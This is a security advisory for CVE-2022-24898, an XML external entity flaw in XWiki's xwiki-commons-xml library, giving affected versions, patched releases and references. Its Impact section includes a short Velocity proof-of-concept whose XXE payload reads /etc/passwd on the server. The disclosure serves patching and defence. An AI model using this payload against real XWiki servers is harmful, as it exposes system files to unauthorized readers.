# [M] Arbitrary file access through XML parsing in org.xwiki.commons:xwiki-commons-xml

## Summary
Severity: Medium
Advisory: GHSA-m2r5-4w96-qxg5
CVE: CVE-2022-24898
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2022-04-28
Source: https://github.com/advisories/GHSA-m2r5-4w96-qxg5
Type: github-advisory

## Affected
- Maven: `org.xwiki.commons:xwiki-commons-xml` — affected >=2.7 <12.10.10
- Maven: `org.xwiki.commons:xwiki-commons-xml` — affected >=13.0.0 <13.4.4
- Maven: `org.xwiki.commons:xwiki-commons-xml` — affected >=13.5-rc-1 <13.8-rc-1

## Details
### Impact

It's possible in a script to access any file accessing to the user running XWiki application server with XML External Entity Injection through the XML script service.

For example:

```
{{velocity}}
#set($xml=$services.get('xml'))
#set($xxe_payload = "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root[<!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><root><foo>&xxe;</foo></root>")
#set($doc=$xml.parse($xxe_payload))
$xml.serialize($doc)
{{/velocity}}
```

### Patches

The problem has been patched on versions 12.10.10, 13.4.4 and 13.8RC1.

### Workarounds

There's no easy workaround for fixing this vulnerability other than upgrading and being careful when giving Script rights.

### References

https://jira.xwiki.org/browse/XWIKI-18946

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [Jira XWiki](https://jira.xwiki.org)
* Email us at [XWiki Security mailing-list](mailto:security@xwiki.org)

## References
- https://github.com/xwiki/xwiki-commons/security/advisories/GHSA-m2r5-4w96-qxg5
- https://nvd.nist.gov/vuln/detail/CVE-2022-24898
- https://github.com/xwiki/xwiki-commons/commit/947e8921ebd95462d5a7928f397dd1b64f77c7d5
- https://github.com/xwiki/xwiki-commons
- https://jira.xwiki.org/browse/XWIKI-18946
